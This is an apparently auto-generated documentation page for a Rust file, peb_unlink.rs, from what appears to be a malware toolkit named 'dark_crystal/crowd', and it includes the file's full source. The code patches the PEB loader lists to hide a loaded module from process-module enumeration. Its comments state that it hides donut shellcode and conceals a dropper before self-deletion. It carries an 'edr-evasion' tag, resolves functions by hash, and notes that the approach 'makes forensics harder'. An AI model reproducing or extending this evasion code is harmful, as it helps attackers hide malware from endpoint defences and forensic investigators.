# crowd — peb_unlink.rs  (✅ C TIER — PEB module unlinking, zero Win32 calls)

| Field | Value |
|-------|-------|
| **Source** | `src/dark_crystal/crowd/src/peb_unlink.rs` |
| **Lines** | 193 |
| **Tier** | P |
| **Cards** | T009-edr-evasion |
| **Role** | PEB module unlinking |
| **Inline ASM** | Yes |
| **Unsafe blocks** | 6 |

## Purpose

# crowd — peb_unlink.rs  (✅ C TIER — PEB module unlinking, zero Win32 calls)

## PEB Module Unlinking

Desenlaza un módulo cargado de las 3 listas del PEB.Ldr simultáneamente:
- `InLoadOrderModuleList`
- `InMemoryOrderModuleList`
- `InInitializationOrderModuleList`

Después de esta operación, el módulo es invisible a:
- `EnumProcessModules` / `GetModuleHandle`
- `CreateToolhelp32Snapshot(TH32CS_SNAPMODULE)`
- Cualquier enumeración userland basada en PEB.Ldr

### Uso principal
Desenlazar el shellcode donut si fue cargado como DLL (Fase 5, paso 05).
También útil para desenlazar el propio dropper antes de self-delete.

### Implementación
Recorre PEB.Ldr.InLoadOrderModuleList hasta encontrar el módulo
cuya base coincide con `module_base`, luego parchea los punteros
Flink/Blink de los previos y siguientes nodos en las 3 listas.

ATENCIÓN: después del unlink, LibraryLoader puede crashear si hay
referencias vivas al módulo. Llamar sólo cuando el módulo ya no
necesita ser referenciado por Windows.

## Constants

- `DLLBASE_OFFSET`: `usize` = `0x30`
- `INLOAD_OFFSET`: `usize` = `0x00`
- `INMEMORY_OFFSET`: `usize` = `0x10`
- `ININIT_OFFSET`: `usize` = `0x20`

## Public API

### `unlink_module` (line 85)
```rust
pub fn unlink_module(module_base: usize) -> Result<()>
```
Desenlaza el módulo con base `module_base` de las 3 listas del PEB.Ldr.

`module_base` must be the actual DllBase of the target module (non-zero).
To unlink the current process image, use `unlink_self()` instead.

### `unlink_self` (line 177)
```rust
pub fn unlink_self() -> Result<()>
```
Unlink current process image from PEB.Ldr.
Useful for the dropper itself before self-deletion.

## Internal Functions

- `ldr_lock_loader_lock` (unsafe) — Acquire the NT loader lock. Returns the cookie needed for unlock. (line 49)
- `ldr_unlock_loader_lock` (unsafe) — Release the NT loader lock using the cookie from lock. (line 69)
- `inner_unlink` (unsafe) (line 99)
- `unlink_list_entry` (unsafe) — Remove a LIST_ENTRY node by patching its neighbors. (line 159)

## Key Dependencies

- `use anyhow::{anyhow, Result};`

## Full Source

```rust
//! # crowd — peb_unlink.rs  (✅ C TIER — PEB module unlinking, zero Win32 calls)
//!
//! ## PEB Module Unlinking
//!
//! Desenlaza un módulo cargado de las 3 listas del PEB.Ldr simultáneamente:
//!   - `InLoadOrderModuleList`
//!   - `InMemoryOrderModuleList`
//!   - `InInitializationOrderModuleList`
//!
//! Después de esta operación, el módulo es invisible a:
//!   - `EnumProcessModules` / `GetModuleHandle`
//!   - `CreateToolhelp32Snapshot(TH32CS_SNAPMODULE)`
//!   - Cualquier enumeración userland basada en PEB.Ldr
//!
//! ### Uso principal
//! Desenlazar el shellcode donut si fue cargado como DLL (Fase 5, paso 05).
//! También útil para desenlazar el propio dropper antes de self-delete.
//!
//! ### Implementación
//! Recorre PEB.Ldr.InLoadOrderModuleList hasta encontrar el módulo
//! cuya base coincide con `module_base`, luego parchea los punteros
//! Flink/Blink de los previos y siguientes nodos en las 3 listas.
//!
//! ATENCIÓN: después del unlink, LibraryLoader puede crashear si hay
//! referencias vivas al módulo. Llamar sólo cuando el módulo ya no
//! necesita ser referenciado por Windows.

#![allow(dead_code)]

use anyhow::{anyhow, Result};

// Offsets en LDR_DATA_TABLE_ENTRY (x64, sin WOW64):
//   +0x00  InLoadOrderLinks           (LIST_ENTRY)
//   +0x10  InMemoryOrderLinks         (LIST_ENTRY)
//   +0x20  InInitializationOrderLinks (LIST_ENTRY)
//   +0x30  DllBase                    (*mut u8)
const DLLBASE_OFFSET:    usize = 0x30;
const INLOAD_OFFSET:     usize = 0x00;
const INMEMORY_OFFSET:   usize = 0x10;
const ININIT_OFFSET:     usize = 0x20;

// ── Loader lock helpers via RecycledGate ─────────────────────────────────────
// LdrLockLoaderLock / LdrUnlockLoaderLock — must hold the loader lock before
// modifying PEB.Ldr data structures to avoid race conditions with concurrent
// module loads/unloads on other threads.

/// Acquire the NT loader lock. Returns the cookie needed for unlock.
/// Flags=0 means blocking acquire (ULONG Flags, ULONG *Disposition, PVOID *Cookie).
unsafe fn ldr_lock_loader_lock() -> Result<usize> {
    let mut disposition: u32 = 0;
    let mut cookie: usize = 0;
    let args = [
        0usize,                                          // Flags = 0 (blocking)
        &mut disposition as *mut u32 as usize,
        &mut cookie      as *mut usize as usize,
    ];
    let status = crate::recycled::invoke(
        crate::resolve::compute_hash("LdrLockLoaderLock"),
        3,
        &args,
    );
    if status != 0 {
        return Err(anyhow!("LdrLockLoaderLock failed: 0x{:x}", status as u32));
    }
    Ok(cookie)
}

/// Release the NT loader lock using the cookie from lock.
unsafe fn ldr_unlock_loader_lock(cookie: usize) {
    let args = [
        0usize, // Flags = 0
        cookie,
    ];
    let _ = crate::recycled::invoke(
        crate::resolve::compute_hash("LdrUnlockLoaderLock"),
        2,
        &args,
    );
}

/// Desenlaza el módulo con base `module_base` de las 3 listas del PEB.Ldr.
///
/// `module_base` must be the actual DllBase of the target module (non-zero).
/// To unlink the current process image, use `unlink_self()` instead.
pub fn unlink_module(module_base: usize) -> Result<()> {
    if module_base == 0 {
        return Err(anyhow!("unlink_module(0) is ambiguous — use unlink_self() for self-unlink"));
    }
    unsafe {
        // Acquire loader lock to prevent race conditions with concurrent
        // module loads/unloads on other threads.
        let cookie = ldr_lock_loader_lock()?;
        let result = inner_unlink(module_base);
        ldr_unlock_loader_lock(cookie);
        result
    }
}

unsafe fn inner_unlink(target_base: usize) -> Result<()> {
    // Obtener PEB via GS:[0x60]
    let peb: usize;
    core::arch::asm!(
        "mov {}, gs:[0x60]",
        out(reg) peb,
        options(nostack, readonly, pure)
    );
    if peb == 0 { return Err(anyhow!("PEB is null")); }

    // PEB.Ldr at +0x18
    let ldr_ptr = *(((peb + 0x18) as *const usize));
    if ldr_ptr == 0 { return Err(anyhow!("PEB.Ldr is null")); }

    // InLoadOrderModuleList head at PEB.Ldr + 0x10
    let head_load  = ldr_ptr + 0x10;
    let _head_mem   = ldr_ptr + 0x20;
    let _head_init  = ldr_ptr + 0x30;

    let mut found = false;

    // Walk InLoadOrderModuleList
    let mut cur = *(head_load as *const usize); // Flink
    while cur != head_load && cur != 0 {
        // LDR_DATA_TABLE_ENTRY begins at `cur - INLOAD_OFFSET` (= cur for InLoad, offset 0)
        let entry_base = cur; // InLoadOrderLinks IS at offset 0

        let dll_base = *((entry_base + DLLBASE_OFFSET) as *const usize);

        if dll_base == target_base {
            // Found — unlink from all 3 lists
            unlink_list_entry(entry_base + INLOAD_OFFSET);
            unlink_list_entry(entry_base + INMEMORY_OFFSET);
            // InInitializationOrderLinks is at offset 0x20 from entry start.
            // Only present for DLLs that have an init function.
            // Only unlink if the links are actually populated (non-null and
            // not self-referential). Some modules (e.g. ntdll, the process
            // image) may never have been inserted into this list.
            let init_entry = entry_base + ININIT_OFFSET;
            let init_flink = *((init_entry) as *const usize);
            let init_blink = *((init_entry + 8) as *const usize);
            if init_flink != 0 && init_blink != 0
                && init_flink != init_entry && init_blink != init_entry
            {
                unlink_list_entry(init_entry);
            }

            found = true;
            break;
        }

        // Advance: Flink at entry_base + INLOAD
        cur = *((cur) as *const usize); // Flink of LIST_ENTRY
    }

    if found { Ok(()) } else { Err(anyhow!("Module 0x{:x} not found in PEB.Ldr", target_base)) }
}

/// Remove a LIST_ENTRY node by patching its neighbors.
/// `entry`: address of the LIST_ENTRY to remove.
unsafe fn unlink_list_entry(entry: usize) {
    if entry == 0 { return; }
    let flink = *((entry) as *const usize);     // entry.Flink
    let blink = *((entry + 8) as *const usize); // entry.Blink
    if flink == 0 || blink == 0 { return; }

    // blink.Flink = flink
    *((blink) as *mut usize) = flink;
    // flink.Blink = blink
    *((flink + 8) as *mut usize) = blink;

    // Zero out the unlinked entry's pointers (optional — makes forensics harder)
    *((entry) as *mut usize) = entry;     // point to self
    *((entry + 8) as *mut usize) = entry;
}

/// Unlink current process image from PEB.Ldr.
/// Useful for the dropper itself before self-deletion.
pub fn unlink_self() -> Result<()> {
    unsafe {
        // Get own base from PEB + 0x10
        let peb: usize;
        core::arch::asm!(
            "mov {}, gs:[0x60]",
            out(reg) peb,
            options(nostack, readonly, pure)
        );
        let image_base = *((peb + 0x10) as *const usize);
        // Acquire loader lock to prevent race conditions
        let cookie = ldr_lock_loader_lock()?;
        let result = inner_unlink(image_base);
        ldr_unlock_loader_lock(cookie);
        result
    }
}

```